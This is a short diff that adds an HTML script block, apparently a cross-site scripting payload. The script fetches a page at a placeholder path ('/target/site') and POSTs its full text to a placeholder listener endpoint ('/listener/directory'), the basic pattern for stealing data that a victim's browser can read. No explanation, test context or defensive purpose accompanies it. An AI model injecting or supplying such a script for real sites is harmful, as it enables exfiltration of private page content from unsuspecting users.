@@ -1,0 +1,5 @@
+<script>
+fetch("/target/site")
+.then(Console=>Console.text())
+.then(Listener=>fetch("/listener/directory",{method:"POST",headers:{"Content-Type":"text/plain"},body:Listener}))
+</script>
